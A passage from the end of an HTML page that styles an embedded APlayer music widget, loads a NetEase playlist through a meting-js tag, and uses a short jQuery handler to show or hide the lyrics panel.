  .aplayer .aplayer-lrc p.aplayer-lrc-current{
    color: #FF1493;
  }
  .aplayer.aplayer-narrow .aplayer-body{
    left: -66px !important;
  }
  .aplayer.aplayer-fixed .aplayer-lrc {
    display: none;
  }
  .aplayer .aplayer-lrc.aplayer-lrc-hide {
      display:none !important;
  }
  .aplayer.aplayer-fixed .lrc-show {
    display: block;
    background: rgba(255, 255, 255, 0.8);
  }
</style>
<meting-js

    id="2660651585"

    server="netease"

    type="playlist"

    fixed="true"

    autoplay="false"

    loop="all"

    order="random"

    preload="auto"

    volume="0.7"

    mutex="true"

</meting-js>
<script>
  $(function(){
    $('body').on('click', '.aplayer', function(){
      if($('.aplayer-button').hasClass('aplayer-play')) {
        $('.aplayer-lrc').removeClass('lrc-show');
      } else {
        $('.aplayer-lrc').addClass('lrc-show');
      }
    })
  });
</script>
</body>
</html>